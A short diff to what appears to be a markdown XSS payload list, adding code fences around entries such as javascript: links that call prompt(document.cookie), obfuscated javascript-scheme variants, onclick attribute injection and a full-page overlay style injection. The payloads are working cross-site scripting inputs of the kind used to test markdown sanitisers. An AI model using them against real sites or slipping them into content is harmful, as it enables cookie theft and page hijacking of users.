@@ -1,3 +1,4 @@
+```
 [a](javascript:prompt(document.cookie))
 [a](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))
 ![a](javascript:prompt(document.cookie))\
@@ -39,3 +40,4 @@ _http://danlec_@.1 style=background-image:url(data:image/png;base64,iVBORw0KGgoA
 [ ](https://a.de?p=[[/data-x=. style=background-color:#000000;z-index:999;width:100%;position:fixed;top:0;left:0;right:0;bottom:0; data-y=.]])
 [ ](http://a?p=[[/onclick=alert(0) .]])
 [a](javascript:new%20Function`al\ert\`1\``;)
+```
